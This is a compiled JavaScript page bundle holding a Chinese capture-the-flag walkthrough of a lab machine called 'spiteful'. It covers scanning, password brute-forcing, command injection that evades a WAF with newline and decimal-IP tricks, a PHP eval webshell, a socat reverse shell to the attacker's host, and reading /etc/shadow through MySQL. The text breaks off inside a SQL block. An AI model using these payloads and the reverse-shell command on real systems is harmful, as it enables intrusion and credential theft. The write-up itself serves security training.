(window.webpackJsonp=window.webpackJsonp||[]).push([[156],{518:function(s,a,t){"use strict";t.r(a);var n=t(11),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"存活主机扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#存活主机扫描"}},[s._v("#")]),s._v(" 存活主机扫描")]),s._v(" "),a("p",[s._v("arp-scan 扫描网段，发现目标主机")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" arp-scan "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-I")]),s._v(" eth2 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.0/24\n\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.170   08:00:27:56:42:bb       "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Unknown"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("目标IP：192.168.6.170")]),s._v(" "),a("h2",{attrs:{id:"tcp-全端口扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#tcp-全端口扫描"}},[s._v("#")]),s._v(" TCP 全端口扫描")]),s._v(" "),a("p",[s._v("TCP 全端口扫描")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/mazesec/spiteful"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ nmap -p- "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sT")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sV")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.170\n\nPORT   STATE SERVICE VERSION\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v("     OpenSSH "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.0")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("protocol "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2.0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  http    nginx\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("开放了 22、80 端口")]),s._v(" "),a("h2",{attrs:{id:"_80-端口目录扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_80-端口目录扫描"}},[s._v("#")]),s._v(" 80 端口目录扫描")]),s._v(" "),a("p",[s._v("使用 gobuster 进行目录扫描")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/mazesec/spiteful"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ gobuster "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" http://192.168.6.170/    "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v(" /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-x")]),s._v(" php,html,txt,bak\n\n/index.php            "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Status: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("Size: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4002")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n/login.php            "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Status: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("Size: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1801")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n/forgot.php           "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Status: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("Size: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1733")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n/dashboard.php        "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Status: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("302")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("Size: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("--"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" login.php"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[s._v("存在 /index.php、/login.php、/forgot.php、/dashboard.php 页面")]),s._v(" "),a("h2",{attrs:{id:"_80-端口服务探测"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_80-端口服务探测"}},[s._v("#")]),s._v(" 80 端口服务探测")]),s._v(" "),a("p",[s._v("访问首页，猜测存在用户 "),a("code",[s._v("TODD")]),s._v("、"),a("code",[s._v("LL104567")]),s._v("，大小写未知")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/1.png",alt:""}})]),s._v(" "),a("p",[s._v("在 forgot.php 页面，尝试重置任意用户，提示联系 "),a("code",[s._v("ll104567")]),s._v(" 管理员，这里可以大概猜测出管理员 "),a("code",[s._v("TODD")]),s._v("、"),a("code",[s._v("LL104567")]),s._v(" 用户名可能是小写")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/2.png",alt:""}})]),s._v(" "),a("p",[s._v("登录页面抓包放到 burp intruder 模块，使用 rockyou 字典")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/3.png",alt:""}})]),s._v(" "),a("p",[s._v("爆破出 ll104567 用户密码为 111111")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/4.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"命令执行-getshell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#命令执行-getshell"}},[s._v("#")]),s._v(" 命令执行 GetShell")]),s._v(" "),a("p",[s._v("进入 dashboard.php 页面，测试出可以执行一些命令，如 "),a("code",[s._v("id")]),s._v("、"),a("code",[s._v("pwd")]),s._v("、"),a("code",[s._v("uname")]),s._v(" 等")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/5.png",alt:""}})]),s._v(" "),a("p",[s._v("执行其他命令会报错")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/6.png",alt:""}})]),s._v(" "),a("p",[s._v("尝试 busybox 反弹shell，发现靶机可以出网，不过有拦截")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/7.png",alt:""}})]),s._v(" "),a("p",[s._v("猜测老夜在后端专门写了匹配了 ip 的正则，还会拦截管道符重定向符 "),a("code",[s._v("|")]),s._v("、"),a("code",[s._v(">")]),s._v(" 等等")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/8.png",alt:""}})]),s._v(" "),a("p",[a("strong",[s._v("最终发现，存在绕过姿势：使用允许的命令")]),s._v(" "),a("code",[s._v("id")]),s._v("、"),a("code",[s._v("pwd")]),s._v("、"),a("code",[s._v("uname")]),s._v(" "),a("strong",[s._v("等等，拼接换行符 "),a("code",[s._v("%0a")]),s._v("，可以执行任意命令")])]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/9.png",alt:""}})]),s._v(" "),a("p",[s._v("但是如果你的 payload 里有类似 "),a("code",[s._v("... nc x.x.x.x ...")]),s._v(" 这种形式的字符串，waf 还是会叉你，同时不能有管道符、重定向符")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/10.png",alt:""}})]),s._v(" "),a("p",[s._v("kali 写入 webshell 文件，靶机下载即可")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'<?php eval($_POST[1]);?>'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(".txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("因为会匹配 IP，所以选择使用 IP 的10进制形式格式绕过，https://www.metools.info/other/ipconvert162.html")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/11.png",alt:""}})]),s._v(" "),a("p",[s._v("弹个 shell")]),s._v(" "),a("p",[a("img",{attrs:{src:"img/12.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"稳定-shell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#稳定-shell"}},[s._v("#")]),s._v(" 稳定 shell")]),s._v(" "),a("p",[s._v("优化一个反弹shell，可以让 shell 有更多的交互，不会在 sudo -l、vim 等命令下卡死，方向键不会乱跳")]),s._v(" "),a("p",[s._v("靶机比较精简，上传个 socat 二进制文件，kali 常备静态编译好的 socat：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" http://192.168.6.101/socat "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-O")]),s._v(" /tmp/socat\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" +x /tmp/socat\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("使用 socat 稳定shell")]),s._v(" "),a("p",[s._v("kali：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("socat file:"),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("tty")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v(",raw,echo"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" tcp-listen:6666\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("靶机：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("/tmp/socat exec:"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'bash -li'")]),s._v(",pty,stderr,setsid,sigint,sane tcp:192.168.6.101:6666\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("可以拿到一个比较舒服的 shell 环境")]),s._v(" "),a("h2",{attrs:{id:"ssh-登录-todd"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ssh-登录-todd"}},[s._v("#")]),s._v(" ssh 登录 todd")]),s._v(" "),a("p",[s._v("查看 login.php，发现 todd ssh凭证 todd:t0dd@123")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("session_start")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$dbUsr")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'todd'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=>")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'t0dd@123'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'ll104567'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=>")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'111111'")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n")])])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/14.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"mysql-凭证获取"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#mysql-凭证获取"}},[s._v("#")]),s._v(" mysql 凭证获取")]),s._v(" "),a("p",[s._v("todd 可以以 rkhunter 身份执行一个脚本 /opt/web/a.sh，开了一个内置服务器在 8080 端口")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/15.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/16.png",alt:""}})]),s._v(" "),a("p",[s._v("一个登录框，使用 burp intruder 爆破，爆破出 admin:raprap")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/17.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/18.png",alt:""}})]),s._v(" "),a("p",[s._v("在进程里，有个扎眼的 mysql 服务，一不小心使用 admin：raprap 登录成功")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/19.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/20.png",alt:""}})]),s._v(" "),a("p",[s._v("读取到 root 哈希")]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[s._v("MariaDB "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("none"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("user")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("password "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" mysql"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("user")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("-------------+-------------------------------------------+")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("User")]),s._v("        "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Password                                  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("-------------+-------------------------------------------+")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" mariadb"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sys "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("                                           "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" root        "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("41")]),s._v("A2DA7437F678E97120F5B7E7C9B76B3429D257 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" mysql       "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" invalid                                   "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("PUBLIC")]),s._v("      "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("                                           "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" admin       "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("DD621B4732058591E306B53E0CB96066A252CFF "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("-------------+-------------------------------------------+")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("rows")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("in")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("set")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.012")]),s._v(" sec"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("p",[s._v("cmd5 找到对应明文")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/22.png",alt:""}})]),s._v(" "),a("p",[s._v("root：jason04")]),s._v(" "),a("p",[s._v("但是暂时没什么用")]),s._v(" "),a("h2",{attrs:{id:"组信息"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#组信息"}},[s._v("#")]),s._v(" 组信息")]),s._v(" "),a("p",[s._v("靶机查看组信息，发现 mysql 用户属于 shadow 组")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("shadow:x:42:mysql\ntodd:x:1000:\nrkhunter:x:1001:\nmysql:x:102:mysql\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("/etc/shadow 的文件权限，shadow 组可读，mysql 用户可以读取 /etc/shadow 文件")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("spiteful:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-alh")]),s._v(" /etc/shadow\n-rw-r-----    "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" root     shadow       "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("717")]),s._v(" Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("21")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("14")]),s._v(":57 /etc/shadow\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("h2",{attrs:{id:"再度重相逢"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#再度重相逢"}},[s._v("#")]),s._v(" 再度重相逢")]),s._v(" "),a("p",[s._v("回头看 mysql，测试发现 select load_file('/etc/shadow') 返回 NULL，load data infile 可以读取到 /etc/shadow 文件内容")]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[s._v("MariaDB "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("none"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" load_file"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/etc/shadow'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--------------------------+")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" load_file"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/etc/shadow'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--------------------------+")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("NULL")]),s._v("                     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--------------------------+")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("row")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("in")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("set")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.000")]),s._v(" sec"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("-- 创建临时表")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("CREATE")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("TABLE")]),s._v(" mazesec_core"),a("span",{pre:!0,attrs:{class:"token 